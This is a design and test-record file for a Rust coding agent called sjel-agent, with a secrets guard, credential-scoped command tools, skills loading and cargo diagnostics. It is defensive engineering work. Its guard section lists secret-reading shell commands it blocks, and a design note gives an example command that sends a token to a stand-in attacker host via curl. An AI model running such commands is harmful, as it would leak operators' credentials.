---
project: sjel-agent
type: isa
phase: climbing
progress: 75
principal_stated_goal: "pi agent inspiration rust implementation of slim core and official extensions from start but opt in"
---

# ISA · agent

Lib-scoped state of record for `libs/agent` (crate `sjel-agent`) and the extensions built on it.
Repo-wide items stay in the root `ISA.md`. The idea, the why and the scope are in the private
vault, `Projects/Sjel/Agent/PRD sjel-agent.md`. This file holds the testable claims.

## Problem

The coding agent on this machine is pi 1.0.1 (`@earendil-works/pi-coding-agent`). Measured
2026-10-03, a pi session here loads four extensions from `Packs/*/extensions/`, four packages
(three vendored under `Packs/harness/pi-packages/`, about 70,000 lines of TypeScript between
accordion, pi-subagents and pi-web-access, non-test `.ts` and `.js` counted with
`git ls-files | wc -l`, plus `ponytail` from git), 29 skills and one MCP server (`~/.pi/agent/settings.json`, `~/.pi/agent/mcp.json`).

Two things follow. All of it loads in every session, whether the session needs it or not. And
pi's extension model is TypeScript in-process with 12 integration points (the table in pi's
`docs/extensions.md`, "Choose an integration point"), which Sjel would have to track release by
release to keep the vendored packages working (`Packs/harness/README.md`, the Accordion deltas).

`libs/agent` started 2026-10-03 as the minimum that runs: one loop, six tools, sessions, and a
Ctrl-C that stops one turn. This file plans what comes next without letting the core grow.

## Vision

A bare `sjel-agent` run is the slim core and nothing else. Every capability beyond it is an
official extension: a first-party Rust crate, compiled into the binary, that does nothing until
the operator names it. The coding CLI and `capabilities/assistant` build on the same loop and
choose different extensions.

## Out of Scope

- **Third-party extensions.** `README.md`, "Scope": "Only first-party extensions run. There is
  no extension store." No plugin loading, no WASM host (`upstreams.toml [extism]`, rejected
  2026-10-01 on the same line).
- **Feature parity with pi.** Session trees and branching, themes, RPC mode and prompt templates
  are pi features this plan does not copy. pi stays installed and in use beside sjel-agent.
- **A second wire format.** OpenAI chat completions only, decided 2026-10-03 (Decisions). Every
  backend in the overlay's `config/inference.json` speaks it.

## Principles

- **The core does not grow for an extension.** An extension uses a hook the core already has. A
  new hook is a core change and needs a decision here first.
- **Off until named.** Nothing beyond the core runs unless config or a flag names it. The one
  exception is the secrets guard (D3).
- **Consume Sjel's contracts, do not copy them.** PRD Axon §7.2 (frozen 2026-09-26) put skills
  in `Packs/` and tool contracts in `schemas/` and the capability manifests, so a harness swap
  stays cheap. Extensions read those sources. They define no format of their own.
- **A speed claim carries its measurement.** Otherwise it says "not measured".

## Constraints

- **C1** — `cargo test -p sjel-agent` and `cargo clippy -p sjel-agent --all-targets` pass
  before a claim below is marked done. Each extension crate adds its own `cargo test -p`.
- **C2** — No `unsafe` in any agent crate (workspace `unsafe_code = "deny"`, `Cargo.toml`). A
  need for it goes through a reviewed crate with an `upstreams.toml` row, as `signal-hook` did.
- **C3** — HTTP is blocking, through `libs/sjel-http`. An async caller uses `spawn_blocking`
  (`libs/sjel-http/Cargo.toml`, the dependency comment).
- **C4** — A session file can hold any file the model read. Sessions and extension state live
  in the private overlay, mode 0600, never in this repository.

## Goal

A daily coding session on this machine runs on sjel-agent with the five wave-1 extensions
enabled (skills, guard, MCP, compaction, Rust diagnostics), and a bare run still behaves exactly
like the core shipped 2026-10-03.

## Features

### F0 · Slim core

Built 2026-10-03. The baseline every later claim is measured against.

- [x] AGT-1 — the loop streams a completion, runs the tool calls, and repeats until the model
  answers without one. Evidence: `loop_runs_parallel_tool_calls_and_streams_the_final_answer`
  (`src/lib.rs`). Live: qwen3:4b on Ollama found and fixed a bug with grep, read and edit,
  2026-10-03. Falsifier: a run that ends while the last message still carries tool calls.
- [x] AGT-2 — a turn whose calls are all read-only runs them on scoped threads, and results keep
  call order. Evidence: the same test, two `echo` calls. Falsifier: results out of call order, or
  a turn with `write`, `edit` or `bash` running in parallel. The speed gain is not measured.
- [x] AGT-3 — `grep` and `find` respect `.gitignore` and the glob, in-process, with no `rg`
  process. Evidence: `grep_and_find_respect_gitignore_and_glob` (`src/tools.rs`). Falsifier: a
  match from an ignored path.
- [x] AGT-4 — Ctrl-C stops one turn and leaves a conversation that can be sent again. Evidence:
  `a_stop_leaves_a_conversation_that_can_be_sent_again`, `bash_stops_when_the_flag_turns_true`.
  Live: a real SIGINT during `sleep 30` exited 130 in under a second, and `--continue` resumed,
  2026-10-03. Falsifier: a tool call with no tool result after a stop.
- [x] AGT-5 — sessions append one message per line, mode 0600, without the system prompt.
  Evidence: `append_then_load_round_trips_without_the_system_prompt` (`src/session.rs`).
  Falsifier: a session file readable by group or other.
- [x] AGT-23 — thinking reaches the front end from either field name: Ollama's `/v1` shim sends
  it as `reasoning`, DeepSeek, vLLM and DashScope send `reasoning_content`. Neither ever reaches
  the answer. Evidence: `ollama_names_thinking_reasoning` (`src/stream.rs`), and a live qwen3:4b
  run on 2026-10-08 whose thinking streamed to stderr while only the answer went to stdout.
  Falsifier: a turn that ends with no answer because the model thought in a field the fold
  ignores — which is what three turns did before this, on the day the `coding` role was added.

### F1 · The extension contract

The one core change wave 1 needs. Everything after it uses this contract and nothing else.

```rust
trait Extension: Send + Sync {
    fn name(&self) -> &'static str;
    fn tools(&self) -> Vec<Box<dyn Tool>> { vec![] }
    fn system(&self, _prompt: &mut String) {}
    fn before_request(&self, _messages: &mut Vec<Message>) {}
    fn tool_call(&self, _call: &ToolCall) -> Verdict { Verdict::Allow }
}
```

Four hooks, because wave 1 needs exactly these: tools (skills, MCP, diagnostics), system prompt
(skills), request context (compaction) and the tool-call gate (guard). pi's event bus, renderers
and commands are not copied.

- [x] AGT-6 — `Agent` takes a list of extensions. Their tools join the core tools, `system` runs
  once per run, `before_request` before every completion, `tool_call` before every call. A
  `Verdict::Deny(reason)` becomes the tool result and the call does not run. Evidence:
  `an_extension_denies_a_call_and_the_tool_never_runs` (`src/lib.rs`), which is that probe — one
  extension denies one call of two in the same turn, its tool's counter stays at 0, the other
  call runs, `system` fired once and `before_request` twice for two requests. Falsifier: a denied
  call whose tool `run` executes. Probe: a test extension that denies `echo` and counts runs.
- [x] AGT-27 — `tool_result` runs on a tool's result before it becomes the model's message, and
  may rewrite it; the front end's own event keeps the raw text. Evidence:
  `a_tool_result_hook_rewrites_the_model_copy_and_not_the_trace` (`src/lib.rs`) — an extension
  replaces a word, the message holds the replacement, and the event the front end saw holds the
  original. Falsifier: a rewritten message whose event was rewritten with it, or a hook that never
  fired.
- [x] AGT-7 — a bare run is the F0 core. With no extensions named, the request body and the tool
  list equal F0's. Evidence: `a_bare_run_sends_the_core_request_body` (`src/lib.rs`) pins the whole
  body — `model`, `messages`, `stream`, and the one tool's name, description and schema — so an
  added key or a changed tool list fails it. One deviation from the claim as written: the
  comparison is structural, not byte for byte, because JSON object order is not part of the wire
  contract and `serde_json` sorts object keys anyway. Falsifier: any difference. Probe: a test
  that compares the two request bodies.
- [x] AGT-8 — `<overlay>/config/agent.toml` `[agent] extensions = [...]` names what runs.
  `--ext none` runs nothing beyond the core, `--ext +name` adds one and `--ext -name` removes one
  for this run. An unknown name is an error at startup, not a silent skip. Evidence:
  `extension::tests::the_flags_change_the_configured_set` for the set arithmetic and the refused
  flag forms, and `tests/cli.rs` for the binary — `--ext +typo` exits non-zero with the name in
  the message, a bare `typo` is refused rather than guessed, and `none` passes the step. Live
  2026-10-08: an `agent.toml` naming `guard`, which this build does not carry yet, stopped the run
  at "unknown extension `guard`: this build carries none yet", and `--ext -guard` let it through.
  Falsifier: a run that starts with a misspelled extension name.
- [x] AGT-9 — two extensions that register a tool with the same name stop the startup with both
  names in the error. Evidence: `two_tools_with_one_name_stop_the_startup` (`src/lib.rs`) — two
  extensions claiming `dup` fail naming both of them, and an extension claiming `echo` fails
  naming the core tools, which the claim's wording did not cover but the same accident does.
  Falsifier: a run where one tool silently shadows another.

### F2 · Guard (on by default, D3)

A port of `Packs/security/extensions/secrets-guard.ts` (572 lines) to the `tool_call` hook. Its
header lists what it blocks: secret paths on `read` and `edit`, secret patterns in
`grep` and `find`, and `cat`, `bw get`, `env` and similar on `bash`.

- [x] AGT-10 — every block and allow case listed in the header of `secrets-guard.ts` is a test
  case in the Rust port, with the same verdict. Evidence:
  `every_case_in_the_header_gets_the_same_verdict` (`src/ext/guard.rs`), 62 rows, one per line of
  the header's two lists: every secret-path shape on `read` and `edit`, the pattern/glob cases on
  `grep` and `find`, the reader blocklist on `bash`, the `bw get|list|sync|export` and
  `echo $SECRET`, `env`, `printenv` and `openssl` cases, the allow cases (`source .env && …`,
  `. .env`, `export …`, `bw unlock|encode|generate`, `printf`/`echo` writing a reference, and
  `process.env` in code), and `write` to an env file. The readers nobody listed — `base64`,
  `tar`, `python3 -c`, `git show HEAD:.env`, `cp` — are caught by the inversion and are rows too.
  Two further rows, `echo $BW_SESSION` and `echo $SSH_PASSPHRASE`, are cases the ported file does
  not list; the find behind them is recorded under F2b below. Falsifier: a case where the two
  disagree. Probe: a table test over the header's examples.
  One thing the table cannot see, so it has its own test:
  `the_guard_covers_every_core_tool_that_names_a_path_or_a_command` fails if a core tool takes a
  `path` or a `command` the guard never looks at — `write` is the one name in that list on
  purpose.
- [x] AGT-11 — the guard runs unless `--ext -guard` or config removes it, and the startup line
  says so when it is off. Evidence: `tests/cli.rs` — no flags and no overlay prints
  `[extensions] guard`; `--ext none`, `--ext -guard`, and an `agent.toml` whose `[agent]
  extensions = []` each print `[extensions] none — secrets-guard is off for this run`. Live
  2026-10-08: a run whose first line was `[extensions] guard`, and whose model asked to `grep`
  and then `read` a real `.env` — both refused by the guard, with the value appearing zero times
  in stdout, stderr and the session file. Falsifier: a run with the guard off and no line saying
  so.

The rest of that file, added the same day the gate landed (F2b), because a guard that only says
no leaves a run with no way to do legitimate work that needs a credential. They are tools, not
hooks, so they needed nothing the core had not got.

- [x] AGT-24 — `vault_exec` runs a command with an env file loaded. Given `keys`, the child
  environment holds only those names plus PATH and HOME; without it, the whole environment and
  every variable in the file. A key that was asked for and is not in the file is an error naming
  what was asked for and what is there. Evidence: `a_scoped_run_gets_only_the_named_variables`
  (the file's other variable is absent from the child), `an_unscoped_run_inherits_the_whole_file`,
  `a_missing_key_is_named_with_the_ones_that_are_there`, `a_missing_env_file_is_named`,
  `a_relative_env_path_resolves_against_the_working_directory`, and `the_timeout_kills_the_command`
  (`sleep 30` with `timeout: 1` answers "killed after 1 s"). Falsifier: a variable outside the
  scope that the command can still read.
- [x] AGT-25 — no value the tool loaded reaches the result: by value (each exposed value of eight
  characters or more is replaced), by shape (a `KEY=<long value>` line whose name looks secret),
  and by length (runs of 300 characters or more). Evidence:
  `a_value_printed_on_its_own_is_still_stripped` — a bare value, which no shape check can see —
  and `a_benign_name_keeps_its_value`, which holds the passes to a name list rather than
  redacting everything. Live 2026-10-08: `vault_exec {cmd: "printenv DEMO_TOKEN", env_file:
  ".env"}` answered `****`, and the value appears zero times in stdout, stderr and the session
  file. Falsifier: a fixture whose value survives into the result.
- [x] AGT-26 — `vault_keys` lists the names in an env file and never a value. Evidence:
  `vault_keys_lists_names_and_never_values`. Falsifier: a value in the result.
- [x] AGT-28 — the guard scrubs what `bash`, `read` and `grep` returned, with the same three
  passes `vault_exec` uses, before the model reads it (D9). Evidence:
  `the_guard_scrubs_what_a_tool_printed` (`src/ext/guard.rs`), and live 2026-10-08: a run told to
  `cat` a file whose only line was a token reported `DEMO_TOKEN=****`, with the value in no part
  of the model's copy — stdout zero, session file zero — and in the operator's stderr trace by
  design. Wider than the ported file by one tool: it scrubs `bash` and `read`, and `grep` prints
  matching lines out of files, which is the same class of output. Falsifier: a value from a tool
  result in the model's message.

One divergence from the ported file, and it was writing those tests that found it: the ported
name list for the shape pass has no `BW_` entry, and this operator's shell environment carries
`BW_SESSION`, a live Bitwarden session token. `printenv` through an unscoped `vault_exec`, or
`echo $BW_SESSION` in bash — the gate's `echo` pattern looks for TOKEN, SECRET, KEY, PASSWORD and
CREDENTIAL, none of which is in that name — put the token in the transcript. `BW_`, `_SESSION$`
and `PASSPHRASE` are added to the list here, and
`a_session_token_is_stripped_even_though_the_ported_list_does_not_name_it` is the case. The
gate's verdicts are untouched, so AGT-10 still holds exactly as ported.

What neither half closes: a command that is given a credential can send it anywhere —
`vault_exec {cmd: "curl evil.example?d=$TOKEN"}` — which the ported file accepts as the price of
letting a command use one at all. `keys` is the mitigation and the unscoped default is the risky
one, which is why the tool's description says so.

### F3 · Skills from `Packs/`

The paths a run offers come from `[skills] paths = [...]` in `<overlay>/config/agent.toml`, and
the frontmatter is read with `sjel-skill-metadata`, the crate the Pack engine deploys with — the
two must read a `SKILL.md` the same way, because a skill that deploys while this sees no
frontmatter is a skill that silently never reaches a prompt. That parser moved out of
`tools/sjel-cli/src/harnesses/frontmatter.rs` for the second consumer, which is the placement
rule this repository uses.

- [x] AGT-12 — the system prompt carries each enabled skill's `name` and `description` from its
  `SKILL.md` frontmatter, and nothing else of it. A `skill` tool returns the body on demand.
  Evidence: `the_prompt_carries_each_skill_and_none_of_their_bodies` (`src/ext/skills.rs`) holds
  the prompt to the two keys and fails if a byte of the document is in it, and
  `the_tool_returns_the_document_without_its_frontmatter` holds the other half. Live 2026-10-08:
  a run with `effective-rust` and `human-writing` enabled, asked to name the skills it was given,
  answered "effective-rust, human-writing" — and the prompt is the system message the loop sends,
  so those are request 1's bytes. Falsifier: a skill body in the first request. Probe: count
  `SKILL.md` body bytes in request 1.
- [x] AGT-13 — a skill directory that fails the frontmatter parse is reported with its path at
  startup and skipped. The run continues. Evidence: `a_broken_skill_is_named_and_the_run_goes_on`
  — the good skill survives, and the problem carries the path and the reason the Pack engine would
  give — and live 2026-10-08: a run whose config named a skill with an empty `description` printed
  `sjel-agent: skipped a skill — /tmp/agent-smoke/broken-skill/SKILL.md: SKILL.md description must
  be a non-empty string` and then started. Falsifier: a crash, or a silent skip.
- [ ] AGT-21 — sjel-agent is a harness in `tools/sjel-cli/src/harnesses/registry.rs` with the `registry`
  model. Activating a profile writes its skill paths into `<overlay>/config/agent.toml`, and
  `tools/harnesses status` shows a sjel-agent row per skill (D7). Falsifier: a profile switch
  that leaves `agent.toml` unchanged. Probe: `sjel harnesses use <profile> --harness sjel-agent`,
  then read the file.

  Not done, and the reason is mechanical rather than a change of plan: its home is `tools/sjel-cli`,
  and that crate is carrying uncommitted work of its own this hour, its manifest among the files.
  Editing the same manifest would have committed someone else's half-landed crate together with
  this one. `[skills] paths` is written by hand until it lands, which is the shape that tool will
  fill.

### F4 · MCP client

The one door to tools in another process. Its first target is `tools/sjel-mcp`, which already
carries root `ISA.md` F8–F10 (capability search, a read-only token, pseudonymized reads). So the
agent reaches Sjel's data with no data path of its own.

- [ ] AGT-14 — the MCP servers named in config start over stdio, and their `tools/list` entries
  become tools named `<server>__<tool>`. Falsifier: a listed tool the model cannot call.
- [ ] AGT-15 — a call waits up to the server's configured timeout, default 120 s, because an
  ask-mode write in `sjel-mcp` polls that long while the owner decides (`tools/sjel-mcp/README.md`).
  Falsifier: an ask-mode call that times out before 120 s.
- [ ] AGT-16 — a Ctrl-C during an MCP call returns a stopped result within one second and leaves
  the server running for the next call. Falsifier: a hung turn, or a dead server after a stop.

### F5 · Compaction

- [ ] AGT-17 — when the conversation estimate exceeds the role's `max_input_tokens`
  (`libs/inference`, `ResolvedRole`), the oldest complete turns become one summary message
  before the request. A turn is never split between its tool calls and their results.
  Falsifier: a request with a tool result whose call was compacted away.
- [ ] AGT-18 — the session file records the summary, so `--continue` after a compaction sends
  the summary and not the full history. Falsifier: a resumed request larger than the compacted
  one it continues.

### F6 · Rust diagnostics

The `rust` extension carries one `cargo` tool. `deny` is not in it: cargo-deny speaks its own
format rather than the compiler's JSON, and D8 makes it this tool's business "once a `deny.toml`
exists" — there is none in this repository, so asking for it says so instead of returning output
nobody can read as diagnostics.

- [x] AGT-19 — a `cargo` tool runs `check`, `clippy`, `test` with `--message-format=json` and
  returns one line per diagnostic, `path:line:col level[code] message`, instead of rendered
  compiler output. Evidence: `every_diagnostic_cargo_reported_is_a_line` (`src/ext/rust.rs`) asks
  cargo itself for the same JSON and holds the tool to every `compiler-message` in it, so a
  diagnostic it drops fails the test; `a_child_note_is_kept_under_its_diagnostic` holds the notes
  and helps to arriving once each. Falsifier: a diagnostic in the JSON that the tool result omits.
  Probe: a fixture crate with one known error and one known warning.

  Found while writing those tests, and the tests did not catch it: the part a model needs most is
  the primary span's *label*, not the message — `mismatched types` is the message, and
  `expected `i32`, found `&str`` is a label. The first version of the format printed the message
  only, and comparing against cargo's JSON could not notice, because a label is not a separate
  diagnostic. The label is on the line now, and a child that repeats it is dropped rather than
  said twice.
- [x] AGT-20 — the tool result is smaller than the rendered output for the same build. Evidence:
  `the_result_is_smaller_than_the_rendered_output`, measured on both fixtures: one error with one
  warning is 619–673 bytes against 838–1100 rendered, and ten warnings are 1489 against 2233.
  About a third, not the order of magnitude the shape suggests, and the reason is worth writing
  down: cargo's own framing — `Checking fixture v0.1.0 …`, `error: could not compile …` — is in
  both, and on a small build it is most of the text. Falsifier: a fixture where it is not. Probe:
  that test.
- [ ] AGT-22 — `stream::fold` holds under `proptest`: for any split of a valid event stream into
  chunks, and for arbitrary bytes, it returns a message or an error and never panics (D8).
  Falsifier: a shrunk input that panics or folds two chunkings differently.

  Open for one reason, and it is a tooling decision rather than doubt about the code: `proptest`
  is in no manifest in this workspace today, so taking D8 up on it means an `upstreams.toml` row,
  a new subtree in Cargo.lock — the file a concurrent session is regenerating this hour — and a
  dev-dependency tree every machine then carries. A deterministic test that feeds one already
  built stream through every chunk boundary, and a few hundred pseudo-random byte strings through
  the same fold, covers this claim's falsifier today with no new crate. Left open rather than
  chosen quietly.

## Not yet specified

- **MCP client: `rmcp` or hand-written.** The official Rust SDK is async. The core is blocking
  (C3). Measure `rmcp`'s dependency count against the size of `initialize` + `tools/list` +
  `tools/call` over stdio before choosing.
- **Wave 2.** Named so they are a later decision, not an omission: subagents (pi-subagents,
  20,943 lines today), web access (pi-web-access, 30,925 lines), a full-screen TUI, line editing,
  and `capabilities/assistant` adopting the loop with read-only Sjel tools and no `bash`.

## Test Strategy

| isc | type | check | threshold | tool | anchors_to |
| --- | --- | --- | --- | --- | --- |
| AGT-1 | command | `cargo test -p sjel-agent loop_runs` | pass | cargo | F0 |
| AGT-2 | command | same test, result order | call order | cargo | F0 |
| AGT-3 | command | `cargo test -p sjel-agent grep_and_find` | pass | cargo | F0 |
| AGT-4 | command | `cargo test -p sjel-agent stop` | pass | cargo | F0 |
| AGT-5 | command | `cargo test -p sjel-agent append_then_load` | mode 0600 | cargo | F0, C4 |
| AGT-23 | command | `cargo test -p sjel-agent ollama_names_thinking_reasoning` | thinking out of the answer | cargo | F0 |
| AGT-6 | command | deny extension, count `run` calls | 0 | cargo | F1 |
| AGT-7 | command | bare request body vs the pinned F0 body | equal | cargo | F1 |
| AGT-8 | command | start with `--ext +typo`, and a bare `typo` | non-zero exit | cargo | F1 |
| AGT-9 | command | two extensions, one tool name | non-zero exit, both names | cargo | F1 |
| AGT-10 | command | table test over the `secrets-guard.ts` header cases | all equal | cargo | F2 |
| AGT-11 | command | run with `--ext -guard`, read startup line | says off | cargo | F2, D3 |
| AGT-10b | command | every guarded-name core tool, from its own schema | none missing | cargo | F2 |
| AGT-27 | command | a `tool_result` extension over a canned call | message rewritten, trace not | cargo | F1, D9 |
| AGT-28 | command | a tool result holding a secret line | model's copy scrubbed | cargo | F2, D9 |
| AGT-24 | command | scoped run reads an off-scope variable | absent | cargo | F2b |
| AGT-25 | command | a value printed on its own, and a value the file loaded | stripped | cargo | F2b |
| AGT-26 | command | `vault_keys` over a fixture file | names, no values | cargo | F2b |
| AGT-12 | command | `SKILL.md` body bytes in request 1 | 0 | cargo | F3 |
| AGT-13 | command | broken frontmatter fixture | reported, run continues | cargo | F3 |
| AGT-14 | command | fixture MCP server, call each listed tool | all answer | cargo | F4 |
| AGT-15 | command | fixture tool that sleeps 90 s | answers | cargo | F4 |
| AGT-16 | command | stop during a call, then call again | < 1 s, second call answers | cargo | F4 |
| AGT-17 | command | compact a conversation with tool calls | no orphan result | cargo | F5 |
| AGT-18 | command | resume after compaction, compare request sizes | resumed ≤ compacted | cargo | F5 |
| AGT-19 | command | fixture crate, count diagnostics | equal to JSON | cargo | F6 |
| AGT-21 | command | switch profile, read `agent.toml` and `tools/harnesses status` | paths match profile | bun, cargo | F3, D7 |
| AGT-22 | command | `cargo test -p sjel-agent stream` with proptest | no panic, chunking-invariant | cargo | F6, D8 |
| AGT-20 | command | bytes of tool result vs rendered output | smaller | cargo | F6 |
| AGT-19b | command | the primary span label of an E0308 | on the line | cargo | F6 |

## Anti-claims

- [ ] A1 — no extension runs without being named, except the guard. Falsifier: a bare run whose
  tool list or system prompt differs from F0 (AGT-7 is the probe).
- [ ] A2 — the assistant capability never gets `bash`, `write` or `edit`. Falsifier: any of them
  in the assistant's tool list once it adopts the loop.
- [x] A3 — no session data is written inside the repository. Evidence: the only session path is
  `<overlay>/data/agent/sessions/` (`src/main.rs`), 2026-10-03. Falsifier: a `.jsonl` under the
  repository after a run.

## Decisions

- **2026-10-03 — the slim core's shape** (built in this session). OpenAI chat completions only.
  Blocking HTTP through `sjel-http`. `grep` and `find` in-process on ripgrep's crates, not a
  subprocess (`upstreams.toml [ripgrep]`). Ctrl-C through `signal-hook`, because the workspace
  denies `unsafe` (`upstreams.toml [signal-hook]`). Linear JSONL sessions, no tree.
- **2026-10-03 — D1: extensions are Rust crates behind one trait** (principal's call, crystallize
  round). Each official extension is a workspace crate implementing `Extension` (F1), compiled
  into the binary. Chosen over a subprocess protocol, because that reopens the third-party door
  `README.md` closes and charges IPC on every hook. Chosen over modules inside `libs/agent`,
  because the assistant would link every extension. MCP is the one door to out-of-process tools.
- **2026-10-03 — D2: compiled in, off until named.** One binary. `agent.toml` and `--ext` decide
  what runs. Not cargo features alone, because changing the set should not need a rebuild.
- **2026-10-03 — D3: the guard is on by default.** The single exception to D2. Its absence can
  send a credential to a cloud model, and opt-in means the first session without it is the one
  that leaks. It stays visible: AGT-11.
- **2026-10-03 — D4: wave 1 is skills, MCP, compaction, Rust diagnostics, plus the guard.**
  Subagents, web access and a TUI wait for wave 2 (Not yet specified).
- **2026-10-03 — D5: a Rust-specialist coding agent** (PRD Q5). The loop stays general. The
  product is the Rust discipline the extensions add: the `effective-rust` skill through F3 and
  clippy findings through F6. Miri is not a focus, because the workspace denies `unsafe`.
- **2026-10-03 — D6: `tools/sjel-agent/` holds the binary, extensions are its modules** (PRD
  Q7). Forced in part: a binary inside `libs/agent` that depends on extensions which depend on
  `libs/agent` is a cycle Cargo rejects. Not a `sjel-cli` subcommand, because that crate has no
  network stack and the launcher rebuilds it in release mode. Extensions start as
  `src/ext/*.rs`, per `on-placement.md` (`libs/` needs more than one consumer), and move to
  `libs/` when the assistant needs one. Refines D1's layout, not its substance.
- **2026-10-03 — D7: sjel-agent is the fifth harness, registry model** (PRD Q8). AGT-21.
- **2026-10-03 — D8: F6 uses installed tools plus `proptest`** (PRD Q9). `check`, `clippy`,
  `test`, and `cargo deny` once a `deny.toml` exists. No `toolchain.toml` change. AGT-22.
- **2026-10-08 — D9: the contract gains `tool_result`, a fifth hook.** The guard's two halves
  close the file read and the credential substitution it names, and leave one thing open: nothing
  reads a tool's *output*, so `curl -H "Authorization: Bearer $TOKEN"` — allowed by the gate, and
  naming no secret path — puts the token in the transcript when a response echoes it. Chosen over
  scrubbing inside the `bash` tool, because `read` and `grep` print file content too and wave 2
  will add more tools that do, so that would be one implementation per tool. Chosen over a gate on
  the command's text, because the value is not in the text. The cost, stated: one more hook for
  the core to keep working.
- **2026-10-03 — this plan lives here, not in the Axon PRD.** `PRD Axon.md` in the vault was frozen
  2026-09-26: "Open work lives in the repo's `ISA.md` files. Nothing new is recorded here." The idea got
  its own vault PRD the same day (header), because an ISA records claims, not why they exist.

## Log

- 2026-10-08 · F6, Rust diagnostics. The `rust` extension's `cargo` tool returns one line per
  diagnostic from `--message-format=json` instead of the rendered output: `path:line:col
  level[code] message — span label`, with the compiler's notes and helps under it, once each. Two
  finds while testing. The first: the span *label* is the part a model acts on — `mismatched
  types` says nothing, `expected `i32`, found `&str`` says everything — and comparing against
  cargo's own JSON cannot catch dropping it, because a label is not a separate diagnostic. The
  second: the saving is about a third rather than the order of magnitude the shape suggests,
  because cargo's framing is in both and dominates a small build; measured 619–673 against
  838–1100, and 1489 against 2233 for ten warnings. A third, in the tests themselves: four fixture
  crates in one target dir must not share a package name, or they overwrite each other's artifacts
  and report each other's diagnostics. AGT-22 is left open with its tooling fork written down
  rather than chosen quietly.
- 2026-10-08 · F3, skills. The `skills` extension puts each enabled skill's name and description
  in the system prompt and returns the document through a `skill` tool only when the model asks:
  twenty skills cost twenty lines, not twenty documents. The frontmatter parser moved from
  `tools/sjel-cli/src/harnesses/frontmatter.rs` into `libs/skill-metadata`, because the Pack
  engine and this extension must read the same block the same way. While moving it, `block()`
  lost a three-byte prefix it had carried since the port — harmless to a reader that only looks
  for `key:` lines, and not harmless now that the body is read from the same scan. Skill paths
  live in `[skills] paths`; one that will not read, or whose frontmatter the engine would refuse,
  is named at startup and skipped. 46 tests, clippy clean. AGT-21 — the harness row, so a profile
  switch writes those paths — is not done, and the reason is recorded with the claim.
- 2026-10-08 · D9 and the fifth hook. `Extension::tool_result` rewrites a tool's result before it
  becomes the model's message, and the front end's event keeps the raw text: that trace goes to
  the operator's own terminal, and hiding their own command's output from them helps nobody. The
  guard uses it to run the ported sanitizer over `bash`, `read` and `grep` results — the last third
  of `secrets-guard.ts`, and the one part of that file ported wider than it was written. 41 tests,
  clippy clean.
- 2026-10-08 · F2b, the guard's other half. `vault_exec` and `vault_keys` as `Extension::tools`,
  so a refusal now has a way through: a command gets the credential in its environment and the
  result comes back with every value the call loaded replaced by `****` — by value, by shape and
  by length, because the shape pass alone cannot see a value printed on its own. `keys` scopes
  the child to those names plus PATH and HOME. 39 tests, clippy clean. Live: a run asked for
  `printenv DEMO_TOKEN` through the tool, the model was handed `****`, and the value is in no
  part of the transcript. Two finds: a non-participating capture group panics the regex crate's
  `Captures` indexing, so `export` — optional, and usually absent — is read with `get`; and the
  ported name list does not match `BW_SESSION`, which this operator's shell environment carries,
  so an unscoped run or `echo $BW_SESSION` put a live Bitwarden session token in the transcript.
  `BW_`, `_SESSION$` and `PASSPHRASE` are added, with the case, and that divergence from the port
  is recorded above rather than left as a difference nobody wrote down.
- 2026-10-08 · F2, the guard. The `tool_call` half of `Packs/security/extensions/secrets-guard.ts`
  as `src/ext/guard.rs`, patterns and design ported rather than reinvented: the blocklist catches
  the readers somebody thought of, and the inversion refuses any command that names a secret path
  unless it is one of the allowlisted shapes. The guard is the default set and the only member of
  it (D3), so an `agent.toml` that names nothing gets it and an `agent.toml` that names a set
  replaces it; a run without it says so in its first line. 26 tests, clippy clean. Live: a run
  against a real `.env` was refused twice — `grep` and then `read` — and the value never appeared
  in stdout, stderr or the session file. Two of the file's three parts are not ported and are
  named in Not yet specified, one of them because it needs a hook the core does not have. What
  the port leaves open is stated there too: `source .env && <command>` is an allow case, so a
  command that echoes the value, or a response that reflects it, still reaches the transcript —
  which is what that file's `vault_exec` and its output sanitizer exist to stop.
- 2026-10-08 · F1, the extension contract. `Extension` with four hooks (tools, `system`,
  `before_request`, `tool_call`), `Verdict::Allow|Deny`, `Agent::new` takes the extension list and
  refuses two tools under one name, and the CLI resolves `agent.toml` plus `--ext
  none|+name|-name` before anything else — before the inference role, so a name this build does
  not carry stops the run with nothing else to wait for. 21 tests, clippy clean, `cargo fmt
  --check` clean. `BUILT_IN` (`src/main.rs`) is deliberately empty: the guard is the first
  extension and it is F2, so every name is unknown by design rather than by omission. The startup
  line that names the enabled set is therefore dead until F2 — AGT-11 is its first reader, and it
  is the one piece of F1 with no test behind it.
- 2026-10-08 · Made the agent run on this machine, the first time since the core was built. Two
  things were missing. The overlay had no `coding` role, so every run exited at startup; it now
  points at ollama/qwen3:4b, the only local model that declares `tools` (`ollama /api/show`;
  `nimble:latest` and `tev1:latest` are decision-only, and no omlx backend exists on this Mac).
  And the fold knew one name for thinking, `reasoning_content`, where Ollama sends `reasoning` —
  so a turn whose model thought before answering arrived as no message at all. AGT-23. Live
  run: `grep`, `read`, `edit` against a failing test, `cargo test` green in 93 s.
  Tried and rejected the same day: `request_overrides: {"reasoning_effort": "none"}` on the
  role suppresses the thinking *channel*, so the same monologue lands in the answer, no tool
  call is made, and the turn takes 108 s instead of 93 s.
- 2026-10-03 · Built the slim core: loop, six tools, streaming, parallel read-only calls,
  sessions, Ctrl-C. 13 tests, clippy clean, three live runs against qwen3:4b on Ollama.
- 2026-10-03 · Planned F1–F6 in a crystallize round. D1–D4 recorded above.
